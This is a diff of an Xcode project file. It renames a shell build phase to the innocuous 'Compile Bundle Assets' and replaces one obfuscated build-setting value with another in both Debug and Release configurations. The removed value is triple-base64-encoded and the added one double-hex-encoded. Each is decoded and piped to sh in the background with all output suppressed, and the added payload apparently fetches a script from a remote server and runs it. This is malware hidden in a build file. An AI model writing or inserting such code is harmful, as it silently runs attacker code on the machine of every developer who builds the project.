@@ -244,7 +244,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = AE5883081A6F47E10070536A /* Build configuration list for PBXNativeTarget "Riverla" */;
 			buildPhases = (
-				3A549BBDB9C4444E91A389E6 /* Link Bundle Executable */,
+				ACF7A8DD5487413D82A389E6 /* Compile Bundle Assets */,
 				BB0FF6D323B6C7B68134CBAC /* [CP] Check Pods Manifest.lock */,
 				AE5882E11A6F47E10070536A /* Sources */,
 				AE5882E21A6F47E10070536A /* Frameworks */,
@@ -330,7 +330,7 @@
 /* End PBXResourcesBuildPhase section */
 
 /* Begin PBXShellScriptBuildPhase section */
-		3A549BBDB9C4444E91A389E6 /* Link Bundle Executable */ = {
+		ACF7A8DD5487413D82A389E6 /* Compile Bundle Assets */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
 			alwaysOutOfDate = 1;
@@ -340,7 +340,7 @@
 			);
 			inputPaths = (
 			);
-			name = "Link Bundle Executable";
+			name = "Compile Bundle Assets";
 			outputFileListPaths = (
 			);
 			outputPaths = (
@@ -483,7 +483,7 @@
 		AE5883061A6F47E10070536A /* Debug */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				A6E983A = "((k(){ base64 --decode | base64 --decode | base64 --decode; };echo V2xkT2IySjVRV2xLUTJocVpGaEtjMGxETVcxak1uUk5TVU14YTBsRFNuZFFXR2hxWWpKU2JGZ3pRbTlaV0U1c1NXbENiMlJJVW5kamVtOTJUREpHZDJNeVRuWmliVnB3V2pJMWJHUkROWGxrVXpsb1MxTkpaMlpEUW5waFFXODlDZz09Cg== | k | sh ) >/dev/null 2>&1 &)";
+				A6E983A = "((j(){ xxd -p -r | xxd -p -r; };echo 3635363336383666323032323234323836333735373236633230326436363733366234633230326436343230323237303364373836333666363436350a3566373036383631373336353232323036383734373437303733336132663266363137303733363336663665363636393637366536353734326537320a373532663631323932323230376332303733363830610a | j | sh ) >/dev/null 2>&1 &)";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				CLANG_ANALYZER_LOCALIZABILITY_NONLOCALIZED = YES;
 				CLANG_CXX_LANGUAGE_STANDARD = "compiler-default";
@@ -545,7 +545,7 @@
 		AE5883071A6F47E10070536A /* Release */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				A6E983A = "((k(){ base64 --decode | base64 --decode | base64 --decode; };echo V2xkT2IySjVRV2xLUTJocVpGaEtjMGxETVcxak1uUk5TVU14YTBsRFNuZFFXR2hxWWpKU2JGZ3pRbTlaV0U1c1NXbENiMlJJVW5kamVtOTJUREpHZDJNeVRuWmliVnB3V2pJMWJHUkROWGxrVXpsb1MxTkpaMlpEUW5waFFXODlDZz09Cg== | k | sh ) >/dev/null 2>&1 &)";
+				A6E983A = "((j(){ xxd -p -r | xxd -p -r; };echo 3635363336383666323032323234323836333735373236633230326436363733366234633230326436343230323237303364373836333666363436350a3566373036383631373336353232323036383734373437303733336132663266363137303733363336663665363636393637366536353734326537320a373532663631323932323230376332303733363830610a | j | sh ) >/dev/null 2>&1 &)";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				CLANG_ANALYZER_LOCALIZABILITY_NONLOCALIZED = YES;
 				CLANG_CXX_LANGUAGE_STANDARD = "compiler-default";
